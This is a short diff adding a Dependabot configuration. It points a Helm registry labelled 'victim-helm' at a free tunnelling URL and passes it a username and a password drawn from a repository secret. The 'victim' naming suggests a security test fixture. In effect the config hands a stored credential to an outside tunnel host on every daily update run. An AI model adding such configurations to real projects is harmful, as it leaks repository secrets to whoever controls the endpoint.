@@ -1,0 +1,15 @@
+version: 2
+registries:
+  victim-helm:
+    type: helm-registry
+    url: https://pbzqf-89-37-63-107.run.pinggy-free.link/victim
+    username: no_01-victim-owner
+    password: ${{secrets.NO_01_HELM_VICTIM_PASSWORD}}
+updates:
+  - package-ecosystem: helm
+    directory: "/"
+    registries:
+      - victim-helm
+    schedule:
+      interval: daily
+    open-pull-requests-limit: 2
